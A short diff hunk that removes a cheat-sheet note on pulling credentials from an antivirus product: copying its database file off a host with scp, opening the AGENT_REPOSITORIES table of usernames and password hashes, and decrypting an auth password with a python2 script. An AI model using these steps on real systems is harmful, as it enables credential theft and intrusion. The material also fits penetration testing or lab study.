@@ -1,7 +1,0 @@
-find db file of AV: .db
-scp <user>@<IP or Domain>:<Location of db file> .
-
-sqlitebrowser <.db file>
-find AGENT_REPOSITORIES table with username and passwordhash
-
-python2 pwd_decrypt.py <AUTH PASSWD VALUE>
